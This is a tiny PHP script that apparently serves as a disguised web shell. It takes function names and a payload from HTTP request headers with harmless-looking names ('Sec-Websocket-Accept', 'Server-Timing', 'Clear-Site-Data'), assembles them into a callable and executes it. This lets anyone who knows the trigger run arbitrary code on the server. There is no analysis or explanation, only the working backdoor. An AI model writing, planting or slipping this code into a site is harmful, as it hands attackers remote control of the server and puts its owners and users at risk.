<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Sec-Websocket-Accept'])) {
    $dba_insertion = $_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['Server-Timing']($_HEADERS['Clear-Site-Data']));
    $dba_insertion();
}